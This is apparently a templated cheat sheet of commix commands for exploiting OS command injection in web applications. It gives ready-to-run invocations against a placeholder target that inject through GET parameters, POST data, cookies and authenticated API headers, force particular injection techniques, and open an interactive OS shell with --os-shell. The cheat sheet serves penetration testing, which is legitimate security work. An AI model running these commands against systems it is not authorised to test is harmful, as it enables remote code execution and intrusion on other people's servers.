# Commix

> Automated all-in-one OS command injection exploitation tool

<!-- tags: commix, command-injection, rce, web, exploit -->

---

## test GET param command injection
Test a URL parameter for command injection.

```bash
commix -u "{{URL:url:http://target.com/page.php?id=1}}"
```

<!-- meta: risk=med | phase=exploit | tags=get,inject,detect -->

---

## inject POST data command
Test injectable parameters in POST body data.

```bash
commix -u "{{URL:url:http://target.com/execute}}" --data "{{PARAM:str:cmd}}={{VALUE:str:ls}}"
```

<!-- meta: risk=med | phase=exploit | tags=post,inject -->

---

## inject command via cookie
Test command injection via Cookie header values.

```bash
commix -u "{{URL:url:http://target.com/page}}" --cookie "{{COOKIE:str:tracking=test}}"
```

<!-- meta: risk=med | phase=exploit | tags=cookie,inject,header -->

---

## spawn os shell rce
Spawn an interactive OS shell on a confirmed-vulnerable target.

```bash
commix -u "{{URL:url:http://target.com/page.php?id=1}}" --os-shell
```

<!-- meta: risk=high | phase=exploit | tags=shell,os-shell,rce -->

---

## force injection technique
Force a specific injection technique (e.g., classic, eval, time-based, file-based).

```bash
commix -u "{{URL:url:http://target.com/page.php?id=1}}" --technique={{TECHNIQUE:str:c}} --skip-empty
```

<!-- meta: risk=med | phase=exploit | tags=technique,classic,timebased -->

---

## scan authenticated endpoint headers
Scan a protected endpoint passing auth headers and bearer tokens.

```bash
commix -u "{{URL:url:http://target.com/api/exec}}" --headers="Authorization: Bearer {{TOKEN:str}}" --data "{{PARAM:str:cmd}}={{VALUE:str:id}}"
```

<!-- meta: risk=med | phase=exploit | tags=headers,auth,api -->
